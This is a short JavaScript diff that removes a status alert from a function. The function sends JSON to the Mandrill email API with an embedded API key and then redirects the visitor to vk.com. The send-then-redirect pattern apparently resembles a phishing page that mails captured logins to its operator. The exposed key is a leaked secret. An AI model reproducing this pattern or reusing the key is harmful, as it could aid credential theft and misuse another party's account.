@@ -6,7 +6,6 @@ function send() {
 	xmlhttp.open('POST', 'https://mandrillapp.com/api/1.0/messages/send.json');
 	xmlhttp.setRequestHeader('Content-Type', 'application/json;charset=UTF-8');
 	xmlhttp.onreadystatechange = function() {
-	   alert(xmlhttp.status)
 	   document.location.href = "https://vk.com/";
 	}
 	xmlhttp.send(JSON.stringify({'key': 'jJvyiaMWRKRJeUOoMc_aDA',
